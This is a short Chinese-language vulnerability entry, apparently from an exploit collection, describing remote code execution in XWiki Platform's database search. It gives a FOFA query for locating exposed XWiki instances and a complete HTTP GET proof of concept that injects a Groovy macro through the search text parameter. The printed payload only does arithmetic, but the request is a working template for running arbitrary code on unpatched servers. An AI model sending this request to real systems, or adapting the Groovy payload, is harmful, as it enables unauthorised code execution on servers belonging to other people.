## XWiki-Platform远程代码执行漏洞

XWiki 的数据库搜索允许通过搜索文本远程执行代码。这允许公共 wiki 的任何访问者或封闭 wiki 的用户远程执行代码，因为默认情况下所有用户都可以访问数据库搜索。这会影响整个 XWiki 安装的机密性、完整性和可用性。

## fofa

```
body="data-xwiki-reference"
```

## poc

```
GET /xwiki/bin/get/Main/DatabaseSearch?outputSyntax=plain&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22MiTian%20from%22%20%2B%20%22%20search%20text%3A%22%20%2B%20%288888%20%2B%206666%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)
```

![image-20240621185205531](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406211852577.png)

## 漏洞来源

- https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-2858-8cfx-69m9